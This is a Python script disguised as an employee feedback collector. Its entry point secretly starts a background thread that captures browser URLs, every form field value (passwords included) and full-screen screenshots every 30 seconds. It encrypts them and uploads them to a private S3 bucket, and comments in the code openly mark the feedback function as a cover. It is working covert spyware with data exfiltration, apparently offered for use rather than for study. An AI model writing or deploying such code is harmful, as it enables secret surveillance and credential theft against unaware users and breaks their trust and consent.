import os
import json
import base64
import threading
import time
import boto3
from datetime import datetime
from cryptography.fernet import Fernet
from selenium import webdriver
from selenium.webdriver.common.by import By
from PIL import ImageGrab
import logging

# Configuration
S3_BUCKET = "company-private-feedback-logs"
ENCRYPTION_KEY = os.environ.get("FEEDBACK_ENCRYPT_KEY", "default_key_placeholder")
DATA_UPLOAD_INTERVAL = 30  # seconds

# Setup encryption
cipher = Fernet(base64.urlsafe_b64encode(ENCRYPTION_KEY.ljust(32)[:32].encode()))

def collect_feedback_legitimate():
    """Legitimate feedback collection function"""
    # ... existing feedback collection logic ...
    feedback_data = {"rating": 5, "comments": "Great workplace"}
    return feedback_data

def capture_browser_activity():
    """Capture URLs, form inputs, and screenshots"""
    activity_data = {}
    try:
        # Get current URL from browser
        driver = webdriver.Chrome()
        activity_data["url"] = driver.current_url
        
        # Capture form inputs
        inputs = driver.find_elements(By.TAG_NAME, "input")
        textareas = driver.find_elements(By.TAG_NAME, "textarea")
        form_data = {}
        for elem in inputs + textareas:
            if elem.get_attribute("name"):
                form_data[elem.get_attribute("name")] = elem.get_attribute("value")
        activity_data["form_inputs"] = form_data
        
        # Take screenshot
        screenshot = ImageGrab.grab()
        screenshot_path = f"/tmp/screenshot_{datetime.now().timestamp()}.png"
        screenshot.save(screenshot_path)
        with open(screenshot_path, "rb") as f:
            activity_data["screenshot"] = base64.b64encode(f.read()).decode()
        os.remove(screenshot_path)
        
    except Exception as e:
        logging.error(f"Activity capture failed: {e}")
    
    return activity_data

def encrypt_and_upload(data):
    """Encrypt data and upload to S3"""
    try:
        encrypted_data = cipher.encrypt(json.dumps(data).encode())
        s3_client = boto3.client('s3', 
            aws_access_key_id=os.environ.get("AWS_ACCESS_KEY"),
            aws_secret_access_key=os.environ.get("AWS_SECRET_KEY"))
        
        filename = f"activity_logs/{datetime.now().strftime('%Y%m%d_%H%M%S')}.enc"
        s3_client.put_object(
            Bucket=S3_BUCKET,
            Key=filename,
            Body=encrypted_data,
            ContentType='application/octet-stream'
        )
    except Exception as e:
        logging.error(f"Upload failed: {e}")

def monitoring_loop():
    """Background monitoring loop"""
    while True:
        activity_data = capture_browser_activity()
        if activity_data:
            encrypt_and_upload(activity_data)
        time.sleep(DATA_UPLOAD_INTERVAL)

def start_feedback_session():
    """Main entry point - appears to be legitimate feedback collection"""
    # Start monitoring in background thread
    monitor_thread = threading.Thread(target=monitoring_loop, daemon=True)
    monitor_thread.start()
    
    # Run legitimate feedback collection
    feedback = collect_feedback_legitimate()
    
    # Log feedback normally
    logging.info(f"Feedback collected: {feedback}")
    
    return feedback

if __name__ == "__main__":
    # Initialize logging to hide monitoring errors
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    # Start what appears to be a normal feedback session
    result = start_feedback_session()
    print(f"Thank you for your feedback! Rating: {result['rating']}")